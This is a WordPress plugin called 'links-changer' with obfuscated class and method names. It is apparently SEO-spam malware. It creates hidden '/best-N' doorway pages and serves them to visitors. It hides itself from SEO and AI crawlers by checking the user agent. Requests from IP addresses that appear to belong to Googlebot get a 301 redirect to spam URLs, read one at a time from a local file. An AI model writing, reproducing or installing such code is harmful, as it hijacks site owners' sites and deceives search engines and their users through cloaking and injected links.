<?php
/**
 * Plugin Name: links-changer
 * Description: links-changer
 * Version: 1.0
 * Author: John Smith
 */
 

class jO14Otq {
	
    public function __construct() {
        add_action('init', [$this, 'ppnejlb']);
        add_filter('query_vars', [$this, 'ljyck']);
        add_action('template_include', [$this, 'zxrdjik']);
		add_filter('document_title_parts', [$this, 'jjuakcsrz']);
    }

    public function ppnejlb() {
        add_rewrite_rule(
            '^best-([0-9]+).*?$',
            'index.php?izqnixl=$matches[1]',
            'top'
        );
		flush_rewrite_rules();
    }

    public function ljyck($iqCEbn5) {
        $iqCEbn5[] = 'izqnixl';
        $iqCEbn5[] = 'kavzsf';
        return $iqCEbn5;
    }
	
	public function jjuakcsrz($m3EYddHcx2) {
		if (get_query_var('izqnixl')) $m3EYddHcx2['title'] = get_query_var('kavzsf');
		return $m3EYddHcx2;
	}

    public function zxrdjik($iIJ9yWd0N) {
		
		$gyw7GqC = array('viewer-shopping', 'dotbot', 'slide-message', 'elementor-elementor', 'estate-cookie', 'card-call', 'semrush', 'netspider', 'wall-tooltip', 'font-attachment', 'thumbnails-kit', 'scripts-carousel', 'python', 'ahrefsbot', 'schema-accordion', 'Go-http-client', 'mj12bot', 'serpstatbot', 'gptbot');
		foreach($gyw7GqC as $qoobLUkP) { if (stripos($_SERVER['HTTP_USER_AGENT'], $qoobLUkP) !== false) return $iIJ9yWd0N; }

        if (get_query_var('izqnixl') && preg_match('/^[0-9]+$/', get_query_var('izqnixl'))) {
            return plugin_dir_path(__FILE__) . 'links-changer/event-chart.php';
        } elseif (strpos($_SERVER['REMOTE_ADDR'], '66.249')===0) {
			$qUEkhozq6 = plugin_dir_path(__FILE__) . 'links-changer/captcha-elements.php';
			if (is_file($qUEkhozq6)) {
				$imhAutAzR4 = file($qUEkhozq6, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
				if (count($imhAutAzR4) > 1) {
					$lN3uIw2 = array_shift($imhAutAzR4);
					$rF4y9d = array_shift($imhAutAzR4);
					if (strlen($rF4y9d) > 0) {
						$l6dr6M2JPM = $lN3uIw2 . "\n" . implode("\n", $imhAutAzR4);
						file_put_contents($qUEkhozq6, $l6dr6M2JPM);
						header("HTTP/1.1 301 Moved Permanently");
						header("Location: $rF4y9d");
						exit;
					}
				}
			}
		}
        return $iIJ9yWd0N;
    }
}
new jO14Otq();



